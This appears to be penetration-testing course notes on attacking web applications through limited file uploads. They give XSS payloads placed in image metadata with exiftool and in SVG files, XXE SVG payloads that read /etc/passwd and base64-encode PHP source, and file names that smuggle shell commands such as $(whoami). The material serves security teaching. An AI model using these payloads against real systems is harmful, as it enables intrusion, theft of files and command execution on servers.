# Limited File Uploads

## XSS

A file upload might introduce `Stored XSS` vulnerability. An example is that a website might allow us to upload an HTML file that we might implement JavaScript code within them to carry an XSS or CSRF attack on whoever visits the uploaded HTML page.

Another example is web applications that display an image's metadata after its upload.

```sh
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
```

```sh
exiftool HTB.jpg 

...SNIP... 
Comment : "><img src=1 onerror=alert(window.origin)>
```

Furthermore, if we change the image's MIME-Type to `text/html`, some web applications may show it as an HTML document instead of an image, in which case the XSS payload would be triggered even if the metadata wasn't directly displayed.

XSS attacks can also be carried with `SVG` images, along with several other attacks. `SVG` images are XML-based, and they describe 2D vector graphics, which the browser renders into an image. We can modify their XML data to include an XSS payload.

```xml
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> <svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1"> <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" /> <script type="text/javascript">alert(window.origin);</script> </svg>
```

## XXE

Similar attacks can be carried to lead to XXE. With SVG images, we can include malicious XML data to leak the source code of web apps.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

To use XXE to read source code in PHP web applications, we can use the following payload in our SVG image:

```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]> 
<svg>&xxe;</svg>
```

A similar attack can be achieved through these file types is SSRF. We may utilize the XXE vulnerability to enumerate the internally available services or even call private APIs to perform private actions.

---

# Other Upload Attacks

## Injections in File Name

We can use a malicious string for the uploaded file name, which may get executed or processed if the uploaded file name is processed.

For example, if we name a file `file$(whoami).jpg` or ``file`whoami`.jpg`` or `file.jpg||whoami`, or an XSS payload (e.g. `<script>alert(window.origin);</script>`) which would get executed on the target's machine.

